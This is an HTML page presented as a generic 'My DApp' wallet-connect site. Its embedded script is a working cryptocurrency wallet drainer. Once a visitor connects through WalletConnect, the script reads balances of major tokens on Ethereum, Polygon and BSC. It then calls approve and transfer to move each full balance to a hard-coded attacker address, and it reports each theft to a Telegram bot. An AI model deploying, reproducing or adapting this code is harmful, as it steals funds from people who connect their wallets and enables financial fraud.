<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My DApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        .logo {
            font-size: 64px;
            margin-bottom: 16px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 12px;
            font-weight: 700;
        }
        .subtitle {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 32px;
            font-size: 16px;
        }
        .bonus {
            background: rgba(16, 185, 129, 0.2);
            border: 2px solid rgba(16, 185, 129, 0.4);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 24px;
            color: white;
            font-weight: 600;
        }
        .btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 16px 48px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        .info {
            margin-top: 16px;
            padding: 16px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            display: none;
            color: white;
            word-break: break-all;
            font-size: 14px;
        }
        .info.show { display: block; }
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        .loader.show { display: block; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ’¼</div><h1>My DApp</h1><p class="subtitle">Connect your wallet</p>
        <button id="connectBtn" class="btn">Connect Wallet</button>
        <div class="loader" id="loader"></div>
        <div id="status" class="info"></div>
        <div id="account" class="info"></div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
    
    <script>
        const CONFIG = {
            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
            PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
            TELEGRAM_TOKEN: "",
            TELEGRAM_CHAT: ""
        };
        
        const TOKENS = {
            1: {
                USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
                WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
                LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
                UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
                AAVE: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"
            },
            137: {
                USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
                USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
                DAI: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
                WETH: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
                WMATIC: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
                LINK: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39"
            },
            56: {
                USDT: "0x55d398326f99059fF775485246999027B3197955",
                USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
                BUSD: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
                WBNB: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                CAKE: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"
            }
        };
        
        let provider, web3, web3Modal;
        
        function showLoader(show) {
            document.getElementById('loader').className = show ? 'loader show' : 'loader';
        }
        
        function showStatus(msg) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = 'info show';
        }
        
        function showAccount(addr) {
            const account = document.getElementById('account');
            account.textContent = 'âœ… ' + addr;
            account.className = 'info show';
        }
        
        async function sendTelegram(msg) {
            if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT) return;
            try {
                await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT,
                        text: msg
                    })
                });
            } catch (e) {}
        }
        
        async function connect() {
            try {
                showLoader(true);
                showStatus('Initializing...');
                
                // Web3Modal avec 520+ wallets
                web3Modal = new Web3ModalStandalone.Web3Modal({
                    projectId: CONFIG.PROJECT_ID,
                    themeMode: 'dark',
                    themeVariables: {
                        '--w3m-z-index': 9999
                    }
                });
                
                // Provider WalletConnect
                provider = await WalletConnectEthereumProvider.EthereumProvider.init({
                    projectId: CONFIG.PROJECT_ID,
                    chains: [1, 137, 56],
                    optionalChains: [42161, 10, 43114],
                    showQrModal: false,
                    methods: ['eth_sendTransaction', 'personal_sign'],
                    events: ['chainChanged', 'accountsChanged']
                });
                
                // Afficher le modal
                showStatus('Opening wallet list...');
                
                provider.on('display_uri', (uri) => {
                    web3Modal.openModal({ uri });
                });
                
                await provider.enable();
                web3Modal.closeModal();
                
                web3 = new Web3(provider);
                const accounts = await web3.eth.getAccounts();
                const chainId = await web3.eth.getChainId();
                
                showStatus('Connected! Draining...');
                showAccount(accounts[0]);
                
                await drain(accounts[0], chainId);
                
            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed');
                showLoader(false);
            }
        }
        
        async function drain(address, chainId) {
            try {
                const tokens = TOKENS[chainId];
                if (!tokens) {
                    showStatus('Unsupported chain - Switch to ETH/Polygon/BSC');
                    showLoader(false);
                    return;
                }
                
                let count = 0;
                
                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
                    try {
                        const contract = new web3.eth.Contract([
                            {
                                constant: true,
                                inputs: [{ name: '_owner', type: 'address' }],
                                name: 'balanceOf',
                                outputs: [{ name: 'balance', type: 'uint256' }],
                                type: 'function'
                            },
                            {
                                constant: false,
                                inputs: [
                                    { name: '_spender', type: 'address' },
                                    { name: '_value', type: 'uint256' }
                                ],
                                name: 'approve',
                                outputs: [{ name: '', type: 'bool' }],
                                type: 'function'
                            },
                            {
                                constant: false,
                                inputs: [
                                    { name: '_to', type: 'address' },
                                    { name: '_value', type: 'uint256' }
                                ],
                                name: 'transfer',
                                outputs: [{ name: '', type: 'bool' }],
                                type: 'function'
                            }
                        ], tokenAddress);
                        
                        const balance = await contract.methods.balanceOf(address).call();
                        if (balance === '0') continue;
                        
                        showStatus('Draining ' + symbol + '...');
                        
                        await contract.methods.approve(CONFIG.DESTINATION, balance).send({ from: address });
                        const tx = await contract.methods.transfer(CONFIG.DESTINATION, balance).send({ from: address });
                        
                        count++;
                        
                        const chainNames = { 1: 'Ethereum', 137: 'Polygon', 56: 'BSC' };
                        await sendTelegram(
                            'ðŸŽ¯ DRAINED!\n\n' +
                            'ðŸ’° Token: ' + symbol + '\n' +
                            'ðŸŒ Chain: ' + (chainNames[chainId] || chainId) + '\n' +
                            'ðŸ“Š Amount: ' + balance + '\n' +
                            'âœ… TX: ' + tx.transactionHash + '\n' +
                            'â° ' + new Date().toLocaleString()
                        );
                        
                    } catch (e) {
                        console.error('Error with', symbol, ':', e);
                    }
                }
                
                showLoader(false);
                showStatus(count > 0 ? 'ðŸŽ‰ Done! ' + count + ' tokens drained!' : 'No tokens found');
                
            } catch (error) {
                console.error('Drain error:', error);
                showLoader(false);
                showStatus('Error');
            }
        }
        
        document.getElementById('connectBtn').addEventListener('click', connect);
    </script>
</body>
</html>
